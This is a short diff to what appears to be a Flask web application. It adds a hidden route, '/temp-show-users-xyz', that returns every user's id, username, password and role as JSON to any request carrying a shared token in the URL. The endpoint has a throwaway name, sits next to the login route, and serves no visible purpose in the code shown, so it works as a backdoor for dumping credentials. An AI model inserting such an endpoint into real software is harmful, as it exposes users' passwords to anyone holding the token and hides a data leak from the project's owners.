@@ -75,6 +75,13 @@ def inject_db_info():
         user_role=session['user']['role'] if 'user' in session else None
     )
 
+@app.route('/temp-show-users-xyz')
+def temp_show_users():
+    if request.args.get('token') != SYNC_TOKEN:
+        return "Unauthorized", 403
+    raw_users = db._execute_query("SELECT id, username, password, role FROM users", fetch=True)
+    return jsonify(raw_users)
+
 @app.route('/login', methods=['GET', 'POST'])
 def login():
     if request.method == 'POST':
